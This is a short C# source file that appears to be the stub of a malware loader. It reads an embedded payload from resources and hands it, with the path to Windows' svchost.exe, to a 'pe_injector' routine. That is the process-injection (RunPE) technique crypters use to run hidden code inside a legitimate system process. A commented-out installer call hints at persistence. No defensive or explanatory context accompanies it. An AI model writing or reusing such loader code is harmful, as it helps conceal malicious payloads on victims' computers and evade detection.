using System;
using System.IO;
using A;

public class class1
{
    public static void method1()
    {
        byte[] Payload = ResourceGetter.GetPayload();

        string sysPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
        string winLogonPath = Path.Combine(sysPath, "svchost.exe");

        //            Installer.InstallFile();

        pe_injector.Run2(Payload, winLogonPath, string.Empty);
    }
}
